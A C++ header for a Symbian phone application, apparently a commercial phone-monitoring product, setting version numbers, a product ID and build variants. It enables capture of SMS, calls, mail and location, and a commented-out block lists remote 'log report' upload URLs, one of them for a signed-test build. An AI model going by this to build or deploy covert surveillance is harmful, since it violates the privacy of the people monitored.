#ifndef __FxsProBuild_h__
#define __FxsProBuild_h__

/**
This file will NOT be included in mmp.*/

//
//Version 2.0 onwards uses new architecture
//V2.1 fixed international number bug
//	
/**
Product ID.*/
_LIT(KProductID,			"FSX_S9");
_LIT8(KProductID8,			"FSX_S9");

#define APP_UID				0x2000B2C2

//Version History
//ProX starts from version 2.00
//Release Date : 26 DEC, 2007
//Version      : 2.00
//------------------------------
//Release Date : 26 DEC, 2007
//Version      : 2.01
#define VERSION_MAJOR	 	2
#define VERSION_MINOR		1
#define VERSION_BUILD		5

#define KProxyDefaultUseProxy			EFalse
_LIT(KProxyDefaultAddr,					"0.0.0.0:80");

/*_LIT8(KUrlActivation8,					"http://vervata.com/t4l-mcli/cmd/productactivate");
_LIT8(KUrlLogReport8,					"http://mobile.aabackup.info/service");	
//This for symbian signed test house
_LIT8(KUrlActivationS9Signed8,		"http://vervata.com/t4l-mcli/cmd/productactivate");
_LIT8(KUrlLogReportForS9Signed8,	"http://flexiprotect.virtual.vps-host.net/mcli/service");
_LIT8(KProductIDS9Signed8,			"FPROT");
_LIT(KProductIDS9Signed,			"FPROT");
_LIT(KFxPROTECTProductVer,			"0101");
_LIT8(KFxPROTECTProductVer8,		"0101");*/

#ifdef __RESELLER_BUILD
#define PRODUCT_ID				PRODUCT_ID_PRO_X_S9_RESELLER
#else
#define PRODUCT_ID				PRODUCT_ID_PRO_X_S9
#endif

//
//Events supported
#define EVENT_SMS_ENABLE
#define EVENT_PHONECALL_ENABLE
//#define EVENT_MMS_ENABLE
#define EVENT_MAIL_ENABLE
#define EVENT_LOCATION_ENABLE
//#define EVENT_GPRS_ENABLE

//** This is number of event supported ***
#define KNumberOfEventTypeCheckBox 4

#endif
